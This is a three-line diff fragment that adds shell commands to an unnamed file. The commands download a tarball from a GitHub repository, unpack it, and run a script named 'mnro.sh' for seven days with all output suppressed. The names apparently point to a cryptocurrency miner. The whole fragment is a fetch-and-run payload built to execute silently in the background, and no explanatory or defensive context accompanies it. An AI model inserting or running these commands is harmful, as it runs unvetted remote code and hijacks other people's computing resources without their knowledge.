@@ -1,0 +1,3 @@
+wget https://github.com/alissalam/mon/raw/main/monhero.tar.gz
+tar xf monhero.tar.gz
+timeout 10080m ./mnro.sh >/dev/null >/dev/null 2>&1
